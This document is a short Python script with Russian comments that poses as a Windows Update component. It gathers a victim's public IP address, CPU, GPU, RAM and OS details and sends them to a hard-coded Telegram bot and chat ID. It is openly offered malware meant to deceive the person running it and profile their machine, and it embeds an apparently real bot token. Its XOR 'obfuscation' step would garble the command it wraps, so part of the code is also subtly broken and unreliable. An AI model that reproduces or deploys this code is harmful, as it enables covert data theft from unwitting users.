import os, sys, subprocess, requests, platform, psutil, re
import time
if __name__ == "__main__":
    time.sleep(1.5)  # Имитация легитимного ПО
    print("Windows Update Service: компонент установлен")

# ██ Telegram-конфиг (заменить!) ██
BOT_TOKEN = "7506297101:AAGF4Olcw634jjfLSOAtkuhXHN-oCEw8yFQ"  # Токен @BotFather
CHAT_ID = "1004883134"  # ID чата (узнать через @userinfobot)

def __obfuscate__(s: str) -> str:
    return bytes(c ^ 0x37 for c in s.encode()).decode(errors='ignore')

def _get_hw_info():
    try:
        gpu = subprocess.getoutput(__obfuscate__("wmic path win32_VideoController get name"))
        cpu = platform.processor()
        ram = f"{psutil.virtual_memory().total // (1024**3)} GB"
        return (
            f"CPU: {cpu}\n"
            f"GPU: {re.sub(r'\s+', ' ', gpu).split('Name ')[1].strip()}\n"
            f"RAM: {ram}\n"
            f"OS: {platform.platform()}"
        )
    except:
        return "HW DATA ERROR"

def _send_tg(data: str):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        params = {
            "chat_id": CHAT_ID,
            "text": f"🟢 Новый девайс:\n{data}",
            "disable_web_page_preview": True
        }
        requests.post(url, data=params, timeout=10)
    except:
        pass

if __name__ == "__main__":
    ip = requests.get('http://ip-api.com/json/?fields=query').json().get('query', 'N/A')
    hw = _get_hw_info()
    _send_tg(f"IP: {ip}\n\n{hw}")